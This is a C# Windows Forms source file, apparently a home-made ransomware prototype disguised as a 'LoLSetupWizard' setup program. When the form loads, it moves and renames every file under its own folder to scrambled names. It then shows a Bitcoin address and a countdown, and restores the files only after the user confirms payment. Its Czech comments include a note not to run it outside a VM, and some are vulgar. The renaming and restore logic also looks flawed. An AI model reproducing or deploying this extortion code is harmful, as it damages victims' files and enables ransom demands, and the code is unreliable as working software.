using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Security.AccessControl;

namespace rw2
{
    //JESTE JSEM TO NETESTOVAL A NEBUDU TO TESTOVAT DOKUD TO NEBUDU MIT VE VM, FAKT TO NETESTUJ BEZ TOHO!
    //naser si hovno B) -03.12.2022
    //naser si hovno B) -10.12.2022
    public partial class Form1 : Form
    {
        public int minutes = 5, seconds = 0, milisec = 0;
        public Form1()
        {
            InitializeComponent();
        }
        string alphabet = "abcdefghijklmnopqrstuvwxyz";
        string password;
        public string getRandomString(int minLength, int maxLength)
        {
            Random rnd = new Random();
            string str = string.Empty;
            int length = rnd.Next(minLength, maxLength+1);
            for(int i = 0; i < length; i++)
            {
                str += alphabet[rnd.Next(0, 26)];
            }
            return str;
        }
        public char getCryptedCharacter(string password, char givenChar)
        {
            int vys = 0;
            if(givenChar == '.')
            {
                return givenChar;
            }
            foreach(char character in password)
            {
                vys += (character * givenChar);
            }
            vys %= 25;
            return alphabet[vys];
        }
        public string getCryptedString(string password, string str)
        {
            string vys = string.Empty;
            foreach(char character in str)
            {
                vys += getCryptedCharacter(password, character);
            }
            return vys;
        }
        /* List string name
         * fileName.suffix - decryptedname.suffix
         * name[i] (where i % 2 == 0), name[i+1]
         * i+=2;
         * 
         * 
         * 
         * 
         * 
         * 
         * 
         */
        List<string> fileNames = new List<string>();
        List<string> filePathsBefore = new List<string>(); //C:Debug:blabla.png
        List<string> filePathsAfter = new List<string>();  //C:Debug:albalb.cdf
        public void encrypce()
        {
            
            string filePath = System.Reflection.Assembly.GetEntryAssembly().Location;
            filePath = filePath.Remove(filePath.Length - System.AppDomain.CurrentDomain.FriendlyName.Length);
            filePathsBefore = Directory.GetFiles(filePath, "*.*", SearchOption.AllDirectories).ToList();
            filePathsBefore.RemoveAll(x => x.Contains("LoLSetupWizard"));
            foreach (string file in filePathsBefore)
            {
                if (file.Contains(@"\")) 
                {
                    string newFile = file;
                    int lengthOfPrefix = file.LastIndexOf('\\');
                    newFile = newFile.Substring(lengthOfPrefix+1);
                    fileNames.Add(newFile);
                    try 
                    { 
                        File.Move(file, newFile);
                    } catch(Exception ex)
                    {
                        newFile = newFile + getRandomString(5, 7);
                        File.Move(file, newFile);
                    }
                }
            }

            
            foreach (string file in fileNames)
            {
                string password = getRandomString(20, 25);
                string cryptedFilePosition = getCryptedString(password, file);
                try
                {
                    File.Move(file, cryptedFilePosition);
                } catch(Exception ex)
                {
                    password = getRandomString(20, 25);
                    cryptedFilePosition = cryptedFilePosition = getCryptedString(password, file);
                    File.Move(file, cryptedFilePosition);
                }
                filePathsAfter.Add(cryptedFilePosition);
            }
        }
        public bool isCodeCorrect(string code)
        { //A--------------------
            if (code.Length != 15)  return false;
            if (code[0] != 'A')     return false;
            return true;
        }
        public void dekrypce()
        {   //C:Debug:blabla.png
            //C:Debug:albalb.cdf
            for(int i = 0; i!= filePathsAfter.Count;i++)
            {
                File.Move(filePathsAfter[i], filePathsBefore[i]);
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            LoLSetupWizard.Form2 f2 = new LoLSetupWizard.Form2();
            f2.Show();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            textBox1.Text = "1FfmbHfnpaZjKFvyi1okTjJJusN455paPH";
        }

        private void button3_Click(object sender, EventArgs e)
        {
            DialogResult dr = MessageBox.Show("Doopravdy jste poslali peníze na zadanou adresu?", "Odpovězte popravdě!", MessageBoxButtons.YesNo);
            if(dr == DialogResult.Yes)
            {
                dekrypce();
            } else
            {
                button3.Visible = false;
            }
            
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            encrypce();
            timer1.Enabled = true;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            milisec--;
            if(milisec < 0)
            {
                seconds--;
                milisec = 99;
                if(seconds < 0)
                {
                    minutes--;
                    seconds = 59;
                    if(minutes == 0)
                    {
                        timer1.Enabled = false;
                        MessageBox.Show("Bye Bye! :-D");
                        Application.Exit();
                    }
                }
            }
            label1.Text = minutes.ToString() + ":" + seconds.ToString()+":"+milisec.ToString("D2");
        }
    }
}
